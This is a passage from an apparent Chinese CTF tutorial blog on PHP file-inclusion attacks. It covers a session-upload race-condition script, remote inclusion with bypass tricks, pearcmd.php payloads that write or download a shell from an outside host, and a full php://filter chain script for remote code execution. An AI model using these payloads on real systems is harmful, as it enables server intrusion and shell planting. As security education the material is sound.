</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nx">event</span><span class="o">.</span><span class="nx">isSet</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span> <span class="o">=</span> <span class="nx">io</span><span class="o">.</span><span class="nx">BytesIO</span><span class="p">(</span><span class="nx">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">response</span> <span class="o">=</span> <span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span>                                            
</span></span><span class="line"><span class="cl">            <span class="nx">url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span> <span class="nx">sessID</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="o">:</span> <span class="s1">&#39;&lt;?php system(&#34;cat *.php&#34;);?&gt;&#39;</span><span class="p">},</span>       <span class="c1">#session中写入一句话
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="nx">f</span><span class="p">)}</span>     <span class="c1">#写入文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">read</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="nx">event</span><span class="o">.</span><span class="nx">isSet</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">response</span> <span class="o">=</span> <span class="nx">session</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="s1">&#39;?file=/tmp/sess_{}&#39;</span><span class="o">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">sessID</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;test&#39;</span> <span class="nx">in</span> <span class="nx">response</span><span class="o">.</span><span class="nx">text</span><span class="o">:</span> <span class="c1">#如果成功打开文件，则竞争成功！
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">print</span><span class="p">(</span><span class="nx">response</span><span class="o">.</span><span class="nx">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">event</span><span class="o">.</span><span class="nx">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[*]retrying...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="c1">#条件竞争
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">event</span> <span class="o">=</span> <span class="nx">threading</span><span class="o">.</span><span class="nx">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">event</span><span class="o">.</span><span class="nx">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">with</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">session</span><span class="p">()</span> <span class="k">as</span> <span class="nx">session</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">write</span><span class="p">,</span> <span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">read</span><span class="p">,</span> <span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="五无限制远程文件包含">五:无限制远程文件包含
</h2><p>无限制远程文件包含是指包含文件的位置并不在本地服务器，而是通过URL的形式包含到其他服务器上的文件，以及执行文件中的恶意代码利用条件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen=on
</span></span><span class="line"><span class="cl">allow_url_include=on
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们看一下怎么实现的，依旧此题</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="o">.</span><span class="nx">”</span><span class="o">.</span><span class="nx">php”</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在我们的云服务器上的web目录同样创建一个php文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//1.php
</span></span><span class="line"><span class="cl">&lt;?php phpinfo(); ?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后进行远程包含</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/1.php?file=http://101.200.39.193/1.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>即可得到phpinfo()页面</p>
<h2 id="六有限制远程文件包含">六:有限制远程文件包含
</h2><p>有限制的远程文件包含是代码中存在特定的前缀和后缀.php /.html 等拓展名过滤的时候，攻击者需要绕过前缀或者拓展名过滤，才能远程执行URL代码,例如下题：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	include($_GET[&#39;filename&#39;].&#34;.html&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><p>通常有限制的远程文件包含可以通过问号、井号、空格绕过</p>
<h3 id="61通过问号绕过">6.1通过问号绕过
</h3><p>可以在问号后面添加html字符串，问号后面的拓展名会被当做查询，从而绕过过滤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/1.php?file=http://101.200.39.193/1.php?
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="62通过号绕过">6.2通过#号绕过
</h3><p>可以在#后面添加HTML字符串，#会截断后面的拓展名，从而绕过拓展名过滤.#的URL编码为%23</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/1.php?file=http://101.200.39.193/1.php%23
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="63通过空格绕过">6.3通过空格绕过
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.abc.com/file.php?filename=http://192.168.2.1/1.php%20
</span></span></code></pre></td></tr></table>
</div>
</div><p>我觉得这个远程文件包含显然是当各种协议都用不了的时候才用，利用面较小</p>
<h2 id="七利用pearcmdphp从lfi到getshell">七:利用pearcmd.php从LFI到getshell
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">条件:register_argc_argv=On
</span></span></code></pre></td></tr></table>
</div>
</div><p>依旧此题</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="o">.</span><span class="nx">”</span><span class="o">.</span><span class="nx">php”</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>当我们打（不出网）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/1.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个<code>&lt;?=phpinfo();?&gt;</code>恶意代码就写进了/tmp/1.php,然后包含/tmp/1.php会执行phpinfo了</p>
<p>如果靶机出网，打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">原理：</span>
</span></span><span class="line"><span class="cl"><span class="nx">当</span> <span class="nx">register_argc_argv</span> <span class="nx">开启时，PHP会把</span> <span class="o">?+</span><span class="nx">a</span><span class="o">+</span><span class="nx">b</span><span class="o">+</span><span class="nx">c</span> <span class="nx">这样的查询字符串，解析成</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">‘argv’</span><span class="p">]</span> <span class="nx">数组，其值为</span> <span class="p">[</span><span class="nx">“a”</span><span class="p">,</span> <span class="nx">“b”</span><span class="p">,</span> <span class="nx">“c”</span><span class="p">]</span><span class="nx">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">pearcmd</span><span class="o">.</span><span class="nx">php</span> <span class="nx">恰好有一个命令叫</span> <span class="nx">config</span><span class="o">-</span><span class="nx">create，它需要两个参数：参数1：一个配置文件模板（可以是任意内容）。参数2：要将这个配置文件保存到的路径。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">这就产生了一个致命的组合：我们可以通过Web请求，让</span> <span class="nx">pearcmd</span><span class="o">.</span><span class="nx">php</span> <span class="nx">执行</span> <span class="nx">config</span><span class="o">-</span><span class="nx">create</span> <span class="nx">命令，并将我们提供的恶意代码（如</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">）写入到服务器上的任何一个我们有权限写的目录。
</span></span></span><span class="line"><span class="cl"><span class="err">分析payload：
</span></span></span><span class="line"><span class="cl"><span class="err"> +config-create+/&amp;：这里的 + 在URL中被解析为空格。PHP解析后，$_SERVER[‘argv’] 的第一个元素是 config-create。
</span></span></span><span class="line"><span class="cl"><span class="err">file=...：这是文件包含漏洞本身的参数，必须保留。
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">/&lt;?=phpinfo()?&gt;+/tmp/1.php：这是继续传递给 config-create 的参数。解析后，第二个元素是 /&lt;?=phpinfo()?&gt;（作为配置文件内容），第三个元素是 /tmp/1.php（作为文件保存路径）
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注意:在传参的时候不能用hackbar用bp，因为&lt;和&gt;会被hackbar编码而不会生效
</span></span></code></pre></td></tr></table>
</div>
</div><p>例题：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2024极客大挑战：ez_include
</span></span><span class="line"><span class="cl">2023-newstar:Include 🍐
</span></span><span class="line"><span class="cl">2024-Lilctf:Your Uns3r
</span></span><span class="line"><span class="cl">2023-newstar:4-复盘
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://xilitter.github.io/2023/01/31/%e5%88%a9%e7%94%a8pearcmd-php%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%8b%bfshell%ef%bc%88LFI%ef%bc%89/index.html"  target="_blank" rel="noopener"
    >利用pearcmd.php文件包含拿shell（LFI） | XiLitter</a></p>
<p><a class="link" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"  target="_blank" rel="noopener"
    >Docker PHP裸文件本地包含综述 | 离别歌</a></p>
<p><a class="link" href="https://wanth3f1ag.top/3025/04/16/%e5%af%b9%e4%ba%8eRCE%e5%92%8c%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e7%9a%84%e4%b8%80%e7%82%b9%e6%80%bb%e7%bb%93/#%e6%97%a0%e9%99%90%e5%88%b6%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab"  target="_blank" rel="noopener"
    >对于RCE和文件包含的一点总结</a></p>
<h2 id="八利用filter过滤器的编码组合构造rce">八：利用filter过滤器的编码组合构造RCE
</h2><p>python脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:49819/?file=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">file_to_use</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/readflag&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># &lt;?=`$_GET[0]`;;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># generate some garbage base64</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># get rid of equal signs</span>
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="n">command</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="n">final_payload</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>php脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
